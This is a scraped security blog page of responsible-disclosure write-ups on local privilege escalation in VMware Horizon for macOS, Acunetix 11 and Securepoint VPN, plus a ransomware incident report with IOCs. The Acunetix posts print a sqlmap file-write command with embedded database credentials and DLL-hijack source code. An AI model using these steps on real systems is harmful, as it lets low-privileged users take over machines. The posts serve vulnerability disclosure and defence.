[![](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-22-at-20.34.49.png)](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-22-at-20.34.49.png)

To investigate the binary further, I used the newly released Fireeye application [Monitor.app](https://www.fireeye.com/services/freeware/monitor.html). It basically is Process Monitor ([procmon](https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx?f=255&MSPPError=-2147217396)) for macOS.

[![](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.30.07.png)](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.30.07.png)

Based on the activities as captured by Monitor.app it was clear that “Open VMware View Client Services” was basically a wrapper around “services.sh”. This makes sense as the [SUID bit is ignored for script files](https://unix.stackexchange.com/questions/364/allow-setuid-on-shell-scripts).

After taking a closer look at this script, I identified the highlighted line in the following screenshot as a starting point for a possible code injection vulnerability. Although I had no idea about the inner workings of “./vmware-usbarbitrator” this binary was immediately my focus for further investigations. The reason for this is that I – as a non-admin user – am able to set the content of the environment variable VMWARE\_VIEW\_USBARBITRATOR\_LOG\_OPTIONS – that is used in an SUID executed script. [![](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.31.03.png)](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.31.03.png)

After taking a closer look at the possible command line options I was pretty sure I could abuse this setup to load a custom kernel extension by abusing the –kext flag. [![](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.31.30.png)](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.31.30.png)

However, there are two further problems:

1. Kernel Extensions are only loaded if they are owned by root : wheel
2. Additionally, KEXTs the have to be [signed by Apple](https://www.google.at/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=0ahUKEwiNkYqsq7bTAhXMOBQKHWoBDWYQFggqMAE&url=https%3A%2F%2Fdeveloper.apple.com%2Flibrary%2Fcontent%2Fdocumentation%2FSecurity%2FConceptual%2FSystem_Integrity_Protection_Guide%2FKernelExtensions%2FKernelExtensions.html&usg=AFQjCNEexKpGuMPVT4eemqihCoaYFqjcgA&sig2=CVuGagNd9TYtoxXrWtZa7Q).

In the course of this LPE I will ignore issue #2. Hence, I [disabled SIP](http://osxdaily.com/2015/10/05/disable-rootless-system-integrity-protection-mac-os-x/).

[![](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-22.06.19.png)](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-22.06.19.png)

So let’s focus on issue #1. To successfully load a kernel extension the binary has to be owned by [root : wheel](http://osxdaily.com/2012/01/12/how-to-manually-install-kernel-extensions-in-mac-os-x/). However, for a normal user it is impossible to set this file system permissions on a any local file. Luckily, I had already invested plenty of time to learn about the In’s and Out’s of file systems at [Tools On Air](http://www.toolsonair.com/2013/stories.php?showindex). So I knew, the only thing I had to do was to abuse [NFS](https://en.wikipedia.org/wiki/Network_File_System). This is possible because NFS allows the server to specify the file system permissions, even if mounted by a user. Any other local or remote file system I know of, ignores files owned by root in some way. So my next step was to simply export a remote folder (on my [Kali Linux](https://www.kali.org/) I always carry around with me) using NFS…

[![](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-22.16.47.png)](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-22.16.47.png)

… and mount it using Finder’s “Connect to Server”.

[![](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.33.30-1.png)](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.33.30-1.png)

After creating a simple KEXT …[![](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.31.53.png)](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.31.53.png)

and updating the Info.plist file to meet the requirements (simply add a dictionary “IOKitPersonalities”) we are ready! [![](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.32.00.png)](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-21.32.00.png)

After copying this KEXT to the NFS server and adapting its permissions to meet the “root:wheel” requirement, we are finally able to start the real exploitation.

[![](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-22.36.17.png)](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-22.36.17.png)

To do so simply set the “VMWARE\_VIEW\_USBARBITRATOR\_LOG\_OPTIONS” environment variable to our previously create KEXT and run “Open VMware View Client Services”. This is enough to load it!

[![](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-22.45.21.png)](https://bogner.sh/wp-content/uploads/2017/04/Screen-Shot-2017-04-21-at-22.45.21.png)

Hence, we gained code execution from a normal user’s account within the kernel context!

## Suggested Solution

Filter or clear the environment variables VMWARE\_VIEW\_USBARBITRATOR\_LOG\_OPTIONS and VMWARE\_VIEW\_USBD\_LOG\_OPTIONS.

## Disclosure Timeline

21-04-2017: The issues has been documented and reported

24-04-2017: VMware started investigating

06-06-2017: Fix ready

08-06-2017: Updated Horizon version [4.5](https://my.vmware.com/web/vmware/details?downloadGroup=CART17Q2_MAC_450&productId=578&rPId=16682) alongside security advisory [VMSA-2017-0011](https://www.vmware.com/us/security/advisories/VMSA-2017-0011.html) released

 Posted by [florian](https://bogner.sh/author/florian/) at 18:27

## [Another Local Privilege Escalation in Acunetix 11](https://bogner.sh/2017/05/another-local-privilege-escalation-in-acunetix-11/ "Another Local Privilege Escalation in Acunetix 11")

 [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/), [Windows](https://bogner.sh/category/windows/)
 [No Responses »](https://bogner.sh/2017/05/another-local-privilege-escalation-in-acunetix-11/#respond)

May 282017

This time I want to discuss another local privilege escalation vulnerability in the web vulnerability scanner Acunetix 11. It can be abused by any local user to gain full control over the system. It has been verified for Acunetix Trail 11.0.163541031 on a fully patched english Windows 7 64-bit.

The underlying issue is that the installed Acunetix PostgresSQL database server can be hijacked by using two different methods. As this database server is running as Local System it can be further abused to write arbitrary files. This in turn can be exploited to gain full control over the system using DLL sideloading.

# Gaining access to the database #1

As stated, there are two different methods to gain access to the PostgresSQL server. The first one is very simple: just connect to it. This is possible because the local address is configured as trusted in the configuration file C:\ProgramData\Acunetix 11 Trial\db\pg\_hba.conf.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-09-at-21.20.54.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-09-at-21.20.54.png)

# Gaining access to the database #2

The second method is as simple: The user-readable configuration file C:\ProgramData\Acunetix 11 Trial\settings.ini contains the cleartext credentials for the database server.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-09-at-21.24.44.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-09-at-21.24.44.png)

# Abusing the database access

Both methods can be used to connect to the database. The easiest way to abuse this access is to use [sqlmap](http://sqlmap.org/). This setup allows one to write files to arbitrary locations. To finally gain full control over the system I analysed the Acunetix service application. This revealed, as shown in the screenshot below, that the Windows library version.dll is not only loaded from the system directory, but also from the application’s current working directory.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-09-at-08.09.39.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-09-at-08.09.39.png)

Hence, I built a library mimicking the real Windows DLL version.dll. However, instead of providing any real functionality, it simply creates a new file on the system drive’s root. You can download the full source code and a precompiled version [here](https://bogner.sh/wp-content/uploads/2017/01/DLL.zip).

Using the following sqlmap command this DLL can then be placed into the folder C:\Program Files (x86)\Acunetix 11 Trial\11.0.163541031.

```

C:\Python27\python.exe sqlmap.py -d "PostgreSQL://wvs:iRk2mQ3GNVqldjhgeGvMj7UNtd3oUmXT@127.0.0.1:45432/wvs" --dbs --file-write version.dll --file-dest "C:\Program Files (x86)\Acunetix 11 Trial\11.0.163541031\version.dll"

```

The following screenshots illustrates the upload process.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-09-at-08.13.31.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-09-at-08.13.31.png)Now simply navigate to C:\Program Files (x86)\Acunetix 11 Trial\11.0.163541031 and verify that the file version.dll has been added.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-09-at-21.50.51.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-09-at-21.50.51.png)

After a reboot the DLL will be loaded by the highly privileged Windows service Acunetix Trial and the file C:\this\_should\_not\_work.txt will be created.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-09-at-21.52.38.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-09-at-21.52.38.png)

# Proof of Concept

To confirm this issue yourself install Acunetix Trail 11.0.163541031 and download the precompiled version of the [proof of concept exploit](https://bogner.sh/wp-content/uploads/2017/01/DLL.zip).

After that, install [Python 2.7](https://www.python.org/download/releases/2.7/), pip using [get-pip.py](https://bootstrap.pypa.io/get-pip.py) and [sqlmap](http://sqlmap.org/) (including its dependencies). Then – as a non admin user – follow the instructions of this post to verify the vulnerability.

# Suggested solution

The database server should be secured: This means that the configuration file pg\_hba.conf should be updated so that the local system should not be considered as trusted anymore and the database configuration file should be secured from unauthorised access using the filesystem ACLs.

An even better idea would be to use an unprivileged user to run the database server in the first place.

# Timeline

* 9.1.2017: The issues has been documented and reported
* 31.3.2017: Asked for update
* 4.4.2017: Fixed version (build 11.0.170941159) has been [released](https://www.acunetix.com/support/build-history/)
* 28.5.2017: Public disclosure

 Posted by [florian](https://bogner.sh/author/florian/) at 18:18

## [Local Privilege Escalation in Acunetix 11](https://bogner.sh/2017/05/local-privilege-escalation-in-acunetix-11/ "Local Privilege Escalation in Acunetix 11")

 [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/)
 [No Responses »](https://bogner.sh/2017/05/local-privilege-escalation-in-acunetix-11/#respond)

May 282017

This post is about a privilege escalation vulnerability in the web vulnerability scanner Acunetix 11. It can be abused by any local user to gain full control over the system. It has been verified on a fully patched english Windows 7 x64 running Acunetix Trail 11.0.163541031.

The underlying issue is that a subprocess (opsrv.exe) of the automatically launched Windows Service “Acunetix Trial” tries to load the DLL C:\DLLs\python3.dll.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-05-at-20.22.38.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-05-at-20.22.38.png)

Although this path does not exist by default it can be created by any local user. This is possible because the filesystem ACLs of the system drive allow anyone to create [new subfolders](https://msdn.microsoft.com/en-us/library/windows/desktop/gg258116%28v%3Dvs.85%29.aspx?f=255&MSPPError=-2147217396).

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-05-at-20.25.16.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-05-at-20.25.16.png)

With that knowledge I created a new DLL that mimics the expected exports of the real python3.dll. However, instead of providing any real functionality it simply creates a new file on the C: drives root. This in turn is only possible for administrators and proofs the we gained full control over the system. You can download the full source [here](https://bogner.sh/wp-content/uploads/2017/01/4-bad_dll.cpp_.txt).

```

/*
	Implement DLLMain with common datatypes so we don't have to include windows.h.
	Otherwise this would cause several compile errors because of the already known but reexported functions.
*/
int DllMain(void* hinst, unsigned long* reason, void* reserved) {
	system("cmd /c \"date > C:\\this_should_not_work.txt\"");
	exit(1);
	return 0;
}

```

After compiling it into a DLL I stored it (logically with a standard User account) as C:\DLLs\python3.dll.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-05-at-20.26.31.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-05-at-20.26.31.png)

After a reboot the DLL was loaded by the highly privileged Windows service Acunetix Trial and the file C:\this\_should\_not\_work.txt was created.

[![](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-05-at-20.30.54.png)](https://bogner.sh/wp-content/uploads/2017/01/Screen-Shot-2017-01-05-at-20.30.54.png)

# Proof of Concept

To confirm this issue yourself install Acunetix Trail 11.0.163541031 and download the precompiled version of the [proof of concept exploit](https://bogner.sh/wp-content/uploads/2017/01/python3.dll_.zip).

After that, as a non-admin user, create the folder C:\DLLs and place the library python3.dll therein. Now simply reboot the system. After that a new file C:\this\_should\_not\_work.txt has been created. This proof that full SYSTEM level access has been gained.

# Suggested solution

All external dependencies should only be loaded from secure locations.

# Timeline

* 5.1.2017: The issue has been documented and reported
* 6.1.2017: The issue has already been escalated to R&D
* 31.3.2017: Asked for update
* 4.4.2017: Fixed version (build 11.0.170941159) has been [released](https://www.acunetix.com/support/build-history/)
* 28.5.2017: Public disclosure

 Posted by [florian](https://bogner.sh/author/florian/) at 18:17

[Older Entries](https://bogner.sh/category/software/page/2/)

### Search

### Pages

* [About Me](https://bogner.sh/about-me/)
  + [Curriculum Vitae](https://bogner.sh/wp-content/uploads/2017/11/Florian-Bogner-CV-20171126-NP.pdf#new_tab)
  + [LinkedIn Profile](https://www.linkedin.com/profile/view?id=368904276#new_tab)
  + [XING Profile](https://www.xing.com/profile/Florian_Bogner9#new_tab)
* [Donate](https://bogner.sh/donate1/)
* [Privacy Policy](https://bogner.sh/privacy-policy/)
* [Projects](https://bogner.sh/projects/)
* [References](https://bogner.sh/references/)
### Categories

* [Hardware](https://bogner.sh/category/hardware/) (4)
* [Linux](https://bogner.sh/category/linux/) (10)
* [Mac OS X](https://bogner.sh/category/mac-os-x/) (41)
* [Network](https://bogner.sh/category/network/) (6)
* [Security](https://bogner.sh/category/security/) (39)
* [Software](https://bogner.sh/category/software/) (34)
* [Tipps](https://bogner.sh/category/tipps/) (60)
* [Tools](https://bogner.sh/category/tools/) (21)
* [UAC Technikum Vienna](https://bogner.sh/category/uac-technikum-vienna/) (2)
* [Uncategorized](https://bogner.sh/category/uncategorized/) (18)
* [Web Security](https://bogner.sh/category/web-security/) (2)
* [Windows](https://bogner.sh/category/windows/) (27)

### Recent Posts

* [G DATA Anti-Virus: Abusing OpenSSL to get local admin](https://bogner.sh/2021/10/g-data-anti-virus-abusing-openssl-to-get-local-admin/)
* [CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/)
* [TeslaRVNG2 meets HAFNIUM Exchange Exploit](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/)
* [Dirty Offline Bulk IP Geolocation](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/)
* [Egregor Post-Incident Monitor / Protector Script](https://bogner.sh/2020/12/egregor-post-incident-monitor-protector-script/)
### Meta

* [Log in](https://bogner.sh/wp-login.php)
* [Entries feed](https://bogner.sh/feed/)
* [Comments feed](https://bogner.sh/comments/feed/)
* [WordPress.org](https://wordpress.org/)

| © 2012 [bogner.sh](http://bogner.sh) |  | [Suffusion theme by Sayontan Sinha](http://aquoid.com/news/themes/suffusion/) |
| --- | --- | --- |



=== Content from bogner.sh_a45b709f_20250126_100408.html ===

# [#bogner.sh](https://bogner.sh)

## [CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/ "CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30")

 [Security](https://bogner.sh/category/security/), [Windows](https://bogner.sh/category/windows/)
 [No Responses »](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/#respond)

Jun 292021

*[ Preamble: A big thanks to the team at Securepoint! They immediately triaged our report and released an initial fix within days. Never forget: Every piece of software contains bugs! It depends on how you deal with them. ]*

During the audit of the Windows 10 base image of one of our clients, we discovered that they were using the free [Securepoint SSL VPN Client](https://www.securepoint.de/produkte/utm-firewalls/vpn-client.html). To be precise, version 2.0.30 – the current release as of writing – was installed.

Diese Schwachstelle wurde im Zuge eines unserer Hacking Workshops identifiziert. Mehr dazu auf unserer Webseite: [Bee IT Security](https://www.bee-itsecurity.at) – Wir machen IT Security verständlich, so dass Sie die richtigen Entscheidungen treffen können!

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)

While taking a first glance at the application, it became clear that it uses two different components: on the one hand there is the user interface (1), which is executed in the context of the current user. On the other hand there is a Windows service which is executed as SYSTEM (2). This could be quite interesting from an attacker’s point of view, in case a normal user could manipulate the backend service in any way.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage11.jpg)

To learn more about the inner workings I used [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon). As shown in the following screenshot the user interface component *SSLVpnClient.exe* (1) uses a TCP connection to communicate with the Windows service *SPSSLVpnService.exe* (2). As discussed before, this service runs as SYSTEM. The actual VPN connection is established by *OpenVPN.exe* (3). The most interesting learning however was, that a OpenVPN configuration file, which is stored in the current users home folder, is passed as argument (4). This means, the file is fully attacker controlled.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage23.jpg)

While reading the [OpenVPN manual](https://community.openvpn.net/openvpn/wiki/Openvpn24ManPage), I found something interesting: By using (for example) the *–tls-verify* directive from within an *\*.ovpn* configuration file, it is possible to execute arbitrary commands. Hence, I created myself a malicious VPN configuration file. As shown in the right window, it launched the *C:\Users\Public\lpe.bat* file.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage75.jpg)

After saving the \*.*ovpn* file into a folder with the same name in *C:\Users\<username>\AppData\Roadming\Securepoint SSL VPN\config\* and restarting the SecurePoint VPN User interface, it is possible to connect to our malicious VPN.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage79.jpg)

By doing so, the *tls-verify* script is executed as SYSTEM and a new administrative user attacker is added. Hence, a normal non-administrative user gained full control over the affected endpoint.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage46.jpg)
## Timeline

* 14.04.2021: The vulnerability was discovered and reported to security@securepoint.de
* 15.04.2021: The report was triaged
* 26.04.2021: Securepoint SSL VPN Client Version 2.0.32 was released, which contains an initial fix for the vulnerability
* 23.06.2021: Securepoint SSL VPN Client Version 2.0.34 was released, which contains additional security measures.
* 28.06.2021: CVE-2021-35523 was assigned: <https://nvd.nist.gov/vuln/detail/CVE-2021-35523>
* 29.06.2021: Responsible disclosure in cooperation with Securepoint: <https://github.com/Securepoint/openvpn-client/security/advisories/GHSA-v8p8-4w8f-qh34>

 Posted by [florian](https://bogner.sh/author/florian/) at 07:00

## [TeslaRVNG2 meets HAFNIUM Exchange Exploit](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/ "TeslaRVNG2 meets HAFNIUM Exchange Exploit")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/#respond)

May 032021

This is the story of a recent Incident Response that we – as [Bee IT Security](https://bee-itsecurity.at/) – had to deal with. The first impression was pretty clear: many of the victim’s most important servers as well as clients were encrypted. One of the domain controllers also showed a ransom note which is never good sign. After a quick glance at the Window title, it was pretty clear that we had to deal with TeslaRVNG2 (anonymised screenshot from a sandbox):

![](https://bogner.sh/wp-content/uploads/2021/05/Screenshot-1.png)

In contrast to REvil or DoppelPaymer there is not much information available about common TeslaRVNG2 TTPs. Hence, we started by analysing one of the encrypted clients with the goal of identifying the internal source of the attack. Thereby we found the following Logon Event (Event id 4624) which documents that the actual Domain Administrator logged on to the now encrypted PC. That event was created in the middle of the night (local time) and just a few hours before the last modified date of the encrypted files. Additionally, all the IT employees use named administrative accounts, which means this logon was caused by the attackers. The source was one of the company’s domain controllers.

![](https://bogner.sh/wp-content/uploads/2021/05/Screenshot-2021-05-02-at-19.13.36.png)

A few seconds after that first logon, the Anti-Virus service was killed as well. Another clear indication that this activity was caused by the criminals.

## The Domain Controller

Hence, we now focused our analysis on the domain controller that was logged as the source of the login. After taking a snapshot, we captured our live response data and waited for the parsing to finish. During that time, I was curious and took a quick glance at the Windows directory. Multiple files caught my attention: MEMORY.dmp, msmpene.exe , …

![](https://bogner.sh/wp-content/uploads/2021/05/3_EXE-in-Windows.jpg)

More interesting stuff was located in inetsrv (*C:\Windows\System32\inetsrv*\). Is this server also the victim’s Exchange Server? Can you already guess what has happened?

![](https://bogner.sh/wp-content/uploads/2021/05/5_inetsrv-1.jpg)

Maybe we start by taking a closer look at *c.ps1*. As shown below *certutil* is abused to download additional payloads. For example, *m6.exe* is a Bitcoin Miner and *dn.ps1* established as backdoor. What immediately confirmed my initial guess: There are many activities (*echo* commands) that suggest that the HAFNIUM Exchange vulnerabilities were part of the attack.

![](https://bogner.sh/wp-content/uploads/2021/05/2_Script-1.jpg)

After talking to the system administrators this guess was confirmed. There were issues with installing the latest Exchange CU, which caused the server to be vulnerable for the critical vulnerabilities for too long.

## The TeslaRVNG2 Cryptolocker

So we now know how the attackers got initial access. But let’s focus on the actual cryptolocker (*msmpene.exe*). By executing the sample in a sandbox, we identified a plaintext log file that was masked as a DLL (*msvsc.dll*). This file gave us a good understanding about what has happened:

![](https://bogner.sh/wp-content/uploads/2021/05/Screenshot-2021-05-02-at-19.44.31.png)

After the malware was launched (0) a network scan is started (1). Based on the observed behaviour we conclude that the IP range is derived from the current IP. However, the malware always used a /24 network here. So, if your company uses multiple subnets, this ransomware will not affect all of them. Again: please implement a network segmentation with a firewall in between!

In a separate thread the local disc is encrypted (2). During that process the original filenames are kept, making it more difficult for end-users to detect the ongoing attack.

For all identified hosts on the network (3) the access level is checked. If admin privileges are available different techniques are used to stop installed anti-virus solutions. After that all shares (4) are encrypted (5). So, there is no “real” lateral movement. The ransomware simply abuses Windows file sharing.

As soon as the local disc was fully encrypted the renaming process was started (6) (*original.txt => id[\*\*\*\*\*\*\*\*].[contact@domain.com].original.txt.teslarvng2*) and the ransom notes (7) are placed.

By comparing the victim’s log with the log of a fully encrypted system we can conclude that the process was interrupted. As shown below, if everything is finished the malware prints “the end :L”. That entry however is missing in the customer’s log.

![](https://bogner.sh/wp-content/uploads/2021/05/Picture-1.png)

Luckily a working backup was available, and the infrastructure could be rebuilt within days! No ransom was paid.

## IOCs

| **Type** | **Description** | **IOC** |
| --- | --- | --- |
| Hash | c.ps1 | c1bb24572db470c07ece739b889032ad9ab28e4d |
| Hash | msmpene.exe | e365a6acd90eb50ddc067790845b6ade0e1034ed |
| Hash | msmpene86.exe | dd9089097c559b1addbefd37b2da0e4bc2334244 |
| Hash | bd.bat | 7ad79e9e92346c425aa2b2ca1caeb64c33451a8d |
| Hash | svchost.exe | 630814297fc44d6df895e60490c57955cad3db31 |
| Host |  | t.hwqloan.com |
| Path |  | C:\inetpub\wwwroot\aspnet\_client\js\demo\wanlins.aspx |
| Path |  | C:\inetpub\wwwroot\aspnet\_client\js\demo\wanlin.txt |
| Hash | dns.ps1 | 0165405f79d402baec05078c4b4559f400a826f5 |
| Hash | m6.exe | 8f72a1e1faf496c05852338dd72aea868aa0f835 |

 Posted by [florian](https://bogner.sh/author/florian/) at 05:00

## [Dirty Offline Bulk IP Geolocation](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/ "Dirty Offline Bulk IP Geolocation")

 [Security](https://bogner.sh/category/security/), [Tools](https://bogner.sh/category/tools/), [Uncategorized](https://bogner.sh/category/uncategorized/)
 [No Responses »](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/#respond)

Jan 192021

As of recently, I quite often receive Excel files with hundreds of IPs which need to be geolocated ([Can you guess where they come from](https://docs.microsoft.com/en-us/microsoft-365/compliance/search-the-audit-log-in-security-and-compliance?view=o365-worldwide)?). Sure, I could import them into our Elastic stack, but would that post then be titled “Dirty”?

So we need to come up with a different solution. While researching the topic, the first thing that became clear was that I need an offline solution. Although most of the time I just try to locate a handful of addresses, but this sometimes explodes to up to 5.000. In that case, it is almost impossible to find a suitable web API. The most generous free services only provide up to 1.000 lookups per week.

Luckily there is [MaxMind](https://www.maxmind.com/). They are the company behind GeoIP, which also offers a free offline database. Simple register for an [account on their website](https://www.maxmind.com/en/geolite2/signup).

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.13.02.png)

[Then access your account](https://www.maxmind.com/en/account/login) and select “Download Files” in the left menu. From the list, select the “GeoLite2 City” database file. It’s important to use the GeoIP2 Binary format.

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.15.11.png)

Finally, it’s time to get dirty: Download the script [dirtyiplocate.py](https://github.com/fbogner/dirtyiplocate/blob/main/dirtyiplocate.py) from Github or clone the whole repository. After that, the geoip2 modules needs to be installed (*pip install geoip2*).

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.19.41.png)

After all that hard work, *dirtyiplocate.py* is ready to rumble. As shown in the following screenshot it’s pretty easy to use. Provide a text file with IPs you want to locate (the *–ips* argument) and specify the output CSV file (the *–output* parameter). In case you want the results to be appended to the output file instead of overwriting it, the *–append* argument can be used.

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.22.50.png)

The following screenshot shows the output of *dirtyiplocate.py*. Excel’s [VLOOKUP](https://support.microsoft.com/en-us/office/vlookup-function-0bbc8083-26fe-4963-8ab8-93a18ad188a1) can now be used to incorporate this data into existing lists. Please always use the datatype TEXT for IP addresses. Otherwise a unicorn dies!

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.31.40.png)

To summaries: I built a dirty script that can be used to do bulk IP geolocation. It can be downloaded here: <https://github.com/fbogner/dirtyiplocate>

 Posted by [florian](https://bogner.sh/author/florian/) at 05:59

## [IT Security “Hausmittel”](https://bogner.sh/2020/11/it-security-hausmittel/ "IT Security “Hausmittel”")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2020/11/it-security-hausmittel/#respond)

Nov 162020

Erfahrungsgemäß sind IT Security Maßnahmen häufig schwierig zu implementieren und verursachen beträchtliche Kosten. Im Zuge unserer Tätigkeit als Security Consultants und Pentester haben wir aber einige Wege erarbeitet, wie einfach und kosteneffizient der Security Level der Infrastruktur erheblich verbessert werden kann.

Die 10 wichtigen „IT Security Hausmittel“ haben wir dazu in einem entsprechenden Whitepaper zusammengefasst.

Im Detail werden dabei drei unterschiedliche Maßnahmen-Kategorien empfohlen:

1. **Infektion**
   Um die Initiale Infektion von Endgeräten zu erschweren, werden Tipps zur Absicherung von gefährlichen Datentypen, Office Makros und PowerShell aufgezeigt
2. **Ausbreitung**
   Der Missbrauch von privilegierten Benutzerkonten ist häufig bei Attacken zu beobachten. Dementsprechend ist es entscheidend diese zu schützen. Einfache Gruppenrichtlinien, wie die Nutzung der PPL Technologie für den lsass.exe Prozess oder die automatische Abmeldung von administrativen Konten helfen digitale Angriffe erheblich zu erschweren.
3. **Compliance**
   Viele Unternehmen kämpfen auch immer noch mit Basistechnologien wie beispielsweise der Festplattenverschlüsselung. Wiederum mit einer Gruppenrichtlinie ist die Aktivierung dieser über BitLocker einfach möglich.

Das Whitepaper mit diesen und vielen weiteren Empfehlungen können Sie kostenlos unter folgender Webadresse herunterladen:

[![](https://bogner.sh/wp-content/uploads/2020/07/Screenshot-2020-07-06-at-10.18.23.png)](https://bee-itsecurity.at/downloads/IT%20Security%20Hausmittel)

Wir als Bee IT Security machen IT Security verständlich, so dass Sie die richtigen Entscheidungen treffen können. Unser Portfolio umfasst: Workshops, Penetration Tests, simuliertes Phishing. Wir freuen uns auf Ihre Kontaktaufnahme unter office@bee-itsecurity.at

 Posted by [florian](https://bogner.sh/author/florian/) at 10:15

## [Oh nein: Unser Honeypot ist verschlüsselt ;-)](https://bogner.sh/2020/04/oh-nein-unser-honeypot-ist-verschlusselt/ "Oh nein: Unser Honeypot ist verschlüsselt ;-)")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2020/04/oh-nein-unser-honeypot-ist-verschlusselt/#respond)

Apr 062020

Wir als [Bee IT Security](https://bee-itsecurity.at/) unterstützten unsere Kunden tatkräftig bei der Absicherung Ihrer Infrastrukturen. Dabei ist es aber natürlich auch unerlässlich die Taktiken der Angreifer zu kennen und zu verstehen. Genau deshalb betreiben wir auch eigene Honeypots: absichtlich anfällige Server im Internet, die von Kriminellen gekapert werden können. Ziel ist es, deren Aktionen aufzuzeichnen, zu analysieren und schlussendlich sicherzustellen, dass die eigenen Absicherungsmaßnahmen die Angriffe abgewehrt hätten.

Mein Lieblings-Honeypot hört auf den Namen “MXB System” und ist mittels des Benutzernamen *admin* und dem absolut sicheren Passwort *admin* direkt aus dem Internet per RDP erreichbar. Für das Monitoring setzen wir eine Vielzahl unterschiedlicher Technologien ein:

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-04-05-at-19.46.58.png)

